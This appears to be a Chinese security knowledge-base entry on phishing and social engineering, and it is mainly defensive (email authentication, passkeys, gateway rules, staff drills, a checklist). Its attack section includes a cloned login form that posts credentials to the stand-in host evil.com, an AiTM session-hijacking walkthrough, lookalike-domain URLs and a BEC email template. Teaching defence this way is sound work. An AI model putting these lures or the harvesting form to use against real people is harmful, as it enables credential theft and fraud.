# 钓鱼与社工攻击 (Phishing & Social Engineering)

> 分类：社会工程学 / 初始访问 | 风险：高 | MITRE ATT&CK T1566 | 攻击链：投递

## 1. 攻击原理

钓鱼利用**人的信任与操作习惯**而非系统漏洞，诱导受害者主动交出凭据、批准授权、打开附件或转账。它是入侵链条中最常见的**初始访问**手段，也是账号接管（见 `42-account-takeover`）的头号入口。

核心要素（成功三件套）：

1. **可信外观**：仿冒域名、真实品牌素材、合法 TLS 证书、甚至寄生在真实站点上。
2. **紧迫理由**：账号异常、工资调整、发票逾期、领导指令。
3. **低摩擦动作**：点一下、扫一下、输一次验证码。

技术演进：早期是静态克隆页（偷密码），现在主流是 **AiTM 中间人钓鱼**（Evilginx 类），实时代理真实站点，连 MFA/OTP 一起窃取并劫持会话，可绕过短信/OTP 二次验证。

## 2. 攻击示例

### 邮件诱导 + 克隆站

```text
发件人：IT 支持 <it-support@site-secure.com>        ← 仿冒域名
主题：您的账号将在 24 小时后被停用
正文：请立即验证：https://site.com.login-verify.net/  ← 可信域名做子域迷惑
```

克隆页把表单 `action` 指向攻击者接口：

```html
<form action="https://evil.com/collect" method="POST">
  <input name="email" placeholder="邮箱">
  <input name="password" type="password" placeholder="密码">
</form>
```

### AiTM 反向代理（绕过 MFA）

```text
1. 受害者点击 phish.site → 攻击者代理转发到真实 login.site.com
2. 受害者输入账号密码 + OTP → 代理实时转发，登录成功
3. 攻击者拿到真实会话 Cookie（含已通过 MFA 的状态）
4. 攻击者用自己的浏览器导入 Cookie → 直接进入账号
```

关键点：受害者看到的是**真实页面**（地址栏是攻击者域名，但页面像素级一致），OTP 输入框也是真的。

### 同形字 / 子域迷惑

```text
síte.com        （í 为 U+00ED，非 ASCII i）
site.com.evil.net
site-com.evil.net
login.site.com@evil.net
https://site.com%2f@evil.net
```

### BEC 商务邮件诈骗

```text
发件人：张总 <zhang.zong@site-corp.com>   ← 注册相似域名
内容：我在开会不方便接电话，这笔款先付一下，账号改成 XXX
```

### 其他载体

| 载体 | 手法 |
|---|---|
| 二维码（Quishing） | 停车罚单、会议胸牌、邮件内嵌二维码绕过链接检测 |
| 短信 / IM | 快递异常、ETC 失效、领导换号 |
| 电话（Vishing） | 假客服引导装远控、报 OTP |
| 搜索广告 | 买品牌词，落地页仿官网（Malvertising） |
| OAuth 同意钓鱼 | 诱导授权恶意第三方应用，拿到长期 API 权限 |
| 日历 / 云盘邀请 | 通知里带恶意链接，绕过邮件网关 |
| HTML Smuggling | 附件是 HTML，JS 在浏览器内生成恶意文件，绕过附件扫描 |

## 3. 影响

- 凭据与会话泄露 → 账号接管（含管理员）
- 资金损失（BEC 平均单案损失远高于普通事件）
- 作为跳板进入内网、投放勒索软件
- 品牌与客户信任受损，客户被二次钓鱼
- 合规事故（个人信息泄露、审计不通过）

## 4. 防御措施

### 4.1 技术侧（优先自动化）

1. **邮件认证三件套**：SPF + DKIM + DMARC，生产域 `p=reject`，并接收/分析 DMARC 聚合报表。
2. **域名资产治理**：
   - 监控证书透明日志（CT Log）发现仿冒域名新证书
   - 注册主要同形字/错拼域名，或至少监控并投诉下线
   - 子域接管排查（悬空 CNAME、未使用的云资源）
3. **修掉「借壳」入口**：开放重定向（`25-open-redirect`）、Host 头注入（`36-host-header-injection`）、XSS（`03-xss`）——这些让钓鱼链接可以挂在可信域名下。
4. **抗钓鱼认证**：Passkey / WebAuthn / FIDO2（Origin 绑定，AiTM 无法重放），逐步替代短信 OTP；高权限账号强制硬件密钥。
5. **会话防护**：会话绑定设备指纹/ASN，异常时要求重认证；缩短高权限会话寿命。
6. **邮件网关**：链接重写与沙箱检测、附件沙箱、外部发件人标识、相似域名告警（`site.com` vs `slte.com`）。
7. **防克隆**：品牌页面加登录来源校验、对已知克隆站做下架流程；监控 Referer 异常。
8. **OAuth 治理**：限制第三方应用授权范围，管理员审批高风险 scope，定期审计已授权应用。
9. **浏览器侧**：CSP、`frame-ancestors`、禁止页面被嵌入（`23-clickjacking`）。

### 4.2 人员侧

- 常态化钓鱼演练（邮件 + 二维码 + AiTM 场景），而不是一次性培训
- 「一键上报可疑邮件」按钮，缩短发现时间
- 一条简单规则：**任何索要密码或验证码的请求都视为可疑**；真客服不会要 OTP
- 新人入职、财务、高管做专项演练

### 4.3 流程侧

- 付款/变更收款账户：双人复核 + 用**已知号码回拨**确认
- 密码重置/邀请链接：域名固定、Token 一次性短时效（`30-sensitive-data-exposure`）
- 客服工单：身份核验问题不可用「公开信息」作答（防社工重置）
- 事件响应：账号泄露后的会话吊销、强制改密、影响面排查

## 5. 配置与代码对比

```dns
; ✅ SPF
site.com.            TXT "v=spf1 include:_spf.mailprovider.com -all"

; ✅ DKIM（示例 selector）
mail._domainkey.site.com. TXT "v=DKIM1; k=rsa; p=MIIBIjANBg..."

; ✅ DMARC：先隔离观察，再拒绝
_dmarc.site.com.     TXT "v=DMARC1; p=reject; rua=mailto:dmarc@site.com; adkim=s; aspf=s; pct=100"
```

```js
// ✅ 防克隆：登录页要求来自自家域名的跳转
app.get('/login', (req, res) => {
  const ref = req.get('Referer');
  if (ref && !ref.startsWith('https://site.com/')) {
    securityLog.warn('suspicious_referer', { ref, ip: req.ip });
  }
  res.render('login');
});
```

```js
// ✅ Passkey 注册/登录（WebAuthn 片段）
import { generateRegistrationOptions, verifyRegistrationResponse } from '@simplewebauthn/server';

const options = await generateRegistrationOptions({
  rpName: 'Site',
  rpID: 'site.com',            // 绑定域名，伪造域名无法复用
  userID: Buffer.from(String(user.id)),
  userName: user.email,
  attestationType: 'none',
  authenticatorSelection: { residentKey: 'required', userVerification: 'required' },
});
```

```yaml
# ✅ 邮件网关规则（伪代码）
rules:
  - name: external_sender_banner
    match: { direction: inbound }
    action: prepend_subject("[外部]")
  - name: lookalike_domain
    match: { sender_domain_similarity_to: ["site.com"], threshold: 0.9 }
    action: quarantine
  - name: dmarc_fail
    match: { dmarc: fail }
    action: reject
```

```nginx
# ✅ 降低被嵌入/被仿冒展示的风险
add_header Content-Security-Policy "frame-ancestors 'none';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

## 6. 自查清单

- [ ] 所有发信域配置 SPF + DKIM + DMARC，生产为 `p=reject`
- [ ] 有仿冒域名/证书监控与下架流程
- [ ] 悬空 CNAME、未使用云资源已清理（防子域接管）
- [ ] 开放重定向、Host 头注入、XSS 已修复
- [ ] 高权限账号使用 Passkey/硬件密钥，支持抗钓鱼 MFA
- [ ] 会话有设备/地域风控与异常重认证
- [ ] 邮件网关有链接沙箱、附件沙箱、相似域名告警
- [ ] 有常态化钓鱼演练与一键上报
- [ ] 付款/改账户流程有双人复核与回拨验证
- [ ] 客服身份核验不依赖公开信息
- [ ] OAuth 第三方授权有审批与定期审计
- [ ] 泄露后会话吊销与强制改密预案可执行

## 7. 参考资料

- MITRE ATT&CK T1566: Phishing
- NIST SP 800-63B（抗钓鱼认证器 AAL3）
- CISA: Phishing Guidance
- FIDO Alliance: Passkeys
- DMARC.org / RFC 7489
